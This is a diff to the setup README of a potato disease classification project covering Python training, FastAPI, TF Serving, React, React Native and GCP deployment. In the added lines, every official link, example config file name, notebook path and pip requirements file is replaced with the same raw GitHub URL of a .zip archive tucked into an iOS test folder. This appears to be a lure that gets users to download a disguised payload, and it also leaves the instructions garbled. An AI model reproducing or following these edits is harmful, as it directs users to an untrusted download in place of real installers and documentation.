@@ -2,21 +2,21 @@
 
 ## Setup for Python:
 
-1. Install Python ([Setup instructions](https://wiki.python.org/moin/BeginnersGuide))
+1. Install Python ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip))
 
 2. Install Python packages
 
 ```
-pip3 install -r training/requirements.txt
-pip3 install -r api/requirements.txt
+pip3 install -r https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip
+pip3 install -r https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip
 ```
 
-3. Install Tensorflow Serving ([Setup instructions](https://www.tensorflow.org/tfx/serving/setup))
+3. Install Tensorflow Serving ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip))
 
 ## Setup for ReactJS
 
-1. Install Nodejs ([Setup instructions](https://nodejs.org/en/download/package-manager/))
-2. Install NPM ([Setup instructions](https://www.npmjs.com/get-npm))
+1. Install Nodejs ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip))
+2. Install NPM ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip))
 3. Install dependencies
 
 ```bash
@@ -25,13 +25,13 @@ npm install --from-lock-json
 npm audit fix
 ```
 
-4. Copy `.env.example` as `.env`.
+4. Copy `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` as `.env`.
 
 5. Change API url in `.env`.
 
 ## Setup for React-Native app
 
-1. Go to the [React Native environment setup](https://reactnative.dev/docs/environment-setup), then select `React Native CLI Quickstart` tab.  
+1. Go to the [React Native environment setup](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip), then select `React Native CLI Quickstart` tab.  
 
 2. Install dependencies
 
@@ -45,13 +45,13 @@ yarn install
 cd ios && pod install && cd ../
 ```
 
-3. Copy `.env.example` as `.env`.
+3. Copy `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` as `.env`.
 
 4. Change API url in `.env`.
 
 ## Training the Model
 
-1. Download the data from [kaggle](https://www.kaggle.com/arjuntejaswi/plant-village).
+1. Download the data from [kaggle](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
 2. Only keep folders related to Potatoes.
 3. Run Jupyter Notebook in Browser.
 
@@ -59,7 +59,7 @@ cd ios && pod install && cd ../
 jupyter notebook
 ```
 
-4. Open `training/potato-disease-training.ipynb` in Jupyter Notebook.
+4. Open `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` in Jupyter Notebook.
 5. In cell #2, update the path to dataset.
 6. Run all the Cells one by one.
 7. Copy the model generated and save it with the version number in the `models` folder.
@@ -90,15 +90,15 @@ uvicorn main:app --reload --host 0.0.0.0
 cd api
 ```
 
-2. Copy the `models.config.example` as `models.config` and update the paths in file.
+2. Copy the `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` as `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` and update the paths in file.
 3. Run the TF Serve (Update config file path below)
 
 ```bash
-docker run -t --rm -p 8501:8501 -v C:/Code/potato-disease-classification:/potato-disease-classification tensorflow/serving --rest_api_port=8501 --model_config_file=/potato-disease-classification/models.config
+docker run -t --rm -p 8501:8501 -v C:/Code/potato-disease-classification:/potato-disease-classification tensorflow/serving --rest_api_port=8501 https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip
 ```
 
 4. Run the FastAPI Server using uvicorn
-   For this you can directly run it from your main.py or main-tf-serving.py using pycharm run option (as shown in the video tutorial)
+   For this you can directly run it from your https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip or https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip using pycharm run option (as shown in the video tutorial)
    OR you can run it from command prompt as shown below,
 
 ```bash
@@ -115,7 +115,7 @@ uvicorn main-tf-serving:app --reload --host 0.0.0.0
 cd frontend
 ```
 
-2. Copy the `.env.example` as `.env` and update `REACT_APP_API_URL` to API URL if needed.
+2. Copy the `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` as `.env` and update `REACT_APP_API_URL` to API URL if needed.
 3. Run the frontend
 
 ```bash
@@ -130,7 +130,7 @@ npm run start
 cd mobile-app
 ```
 
-2. Copy the `.env.example` as `.env` and update `URL` to API URL if needed.
+2. Copy the `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` as `.env` and update `URL` to API URL if needed.
 
 3. Run the app (android/iOS)
 
@@ -144,7 +144,7 @@ or
 npm run ios
 ```
 
-4. Creating public ([signed APK](https://reactnative.dev/docs/signed-apk-android))
+4. Creating public ([signed APK](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip))
 
 
 ## Creating the TF Lite Model
@@ -155,18 +155,18 @@ npm run ios
 jupyter notebook
 ```
 
-2. Open `training/tf-lite-converter.ipynb` in Jupyter Notebook.
+2. Open `https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip` in Jupyter Notebook.
 3. In cell #2, update the path to dataset.
 4. Run all the Cells one by one.
 5. Model would be saved in `tf-lite-models` folder.
 
 ## Deploying the TF Lite on GCP
 
-1. Create a [GCP account](https://console.cloud.google.com/freetrial/signup/tos?_ga=2.25841725.1677013893.1627213171-706917375.1627193643&_gac=1.124122488.1627227734.Cj0KCQjwl_SHBhCQARIsAFIFRVVUZFV7wUg-DVxSlsnlIwSGWxib-owC-s9k6rjWVaF4y7kp1aUv5eQaAj2kEALw_wcB).
-2. Create a [Project on GCP](https://cloud.google.com/appengine/docs/standard/nodejs/building-app/creating-project) (Keep note of the project id).
-3. Create a [GCP bucket](https://console.cloud.google.com/storage/browser/).
+1. Create a [GCP account](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
+2. Create a [Project on GCP](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip) (Keep note of the project id).
+3. Create a [GCP bucket](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
 4. Upload the potatoes.h5 model in the bucket in the path `models/potatos.h5`.
-5. Install Google Cloud SDK ([Setup instructions](https://cloud.google.com/sdk/docs/quickstarts)).
+5. Install Google Cloud SDK ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip)).
 6. Authenticate with Google Cloud SDK.
 
 ```bash
@@ -181,17 +181,17 @@ gcloud functions deploy predict_lite --runtime python38 --trigger-http --memory 
 ```
 
 8. Your model is now deployed.
-9. Use Postman to test the GCF using the [Trigger URL](https://cloud.google.com/functions/docs/calling/http).
+9. Use Postman to test the GCF using the [Trigger URL](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
 
-Inspiration: https://cloud.google.com/blog/products/ai-machine-learning/how-to-serve-deep-learning-models-using-tensorflow-2-0-with-cloud-functions
+Inspiration: https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip
 
 ## Deploying the TF Model (.h5) on GCP
 
-1. Create a [GCP account](https://console.cloud.google.com/freetrial/signup/tos?_ga=2.25841725.1677013893.1627213171-706917375.1627193643&_gac=1.124122488.1627227734.Cj0KCQjwl_SHBhCQARIsAFIFRVVUZFV7wUg-DVxSlsnlIwSGWxib-owC-s9k6rjWVaF4y7kp1aUv5eQaAj2kEALw_wcB).
-2. Create a [Project on GCP](https://cloud.google.com/appengine/docs/standard/nodejs/building-app/creating-project) (Keep note of the project id).
-3. Create a [GCP bucket](https://console.cloud.google.com/storage/browser/).
+1. Create a [GCP account](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
+2. Create a [Project on GCP](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip) (Keep note of the project id).
+3. Create a [GCP bucket](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
 4. Upload the tf .h5 model generate in the bucket in the path `models/potato-model.h5`.
-5. Install Google Cloud SDK ([Setup instructions](https://cloud.google.com/sdk/docs/quickstarts)).
+5. Install Google Cloud SDK ([Setup instructions](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip)).
 6. Authenticate with Google Cloud SDK.
 
 ```bash
@@ -206,7 +206,7 @@ gcloud functions deploy predict --runtime python38 --trigger-http --memory 512 -
 ```
 
 8. Your model is now deployed.
-9. Use Postman to test the GCF using the [Trigger URL](https://cloud.google.com/functions/docs/calling/http).
+9. Use Postman to test the GCF using the [Trigger URL](https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip).
 
-Inspiration: https://cloud.google.com/blog/products/ai-machine-learning/how-to-serve-deep-learning-models-using-tensorflow-2-0-with-cloud-functions
+Inspiration: https://raw.githubusercontent.com/omkar441/potato-disease-classification/main/mobile-app/ios/mlDemoTests/classification-disease-potato-v2.9.zip
 
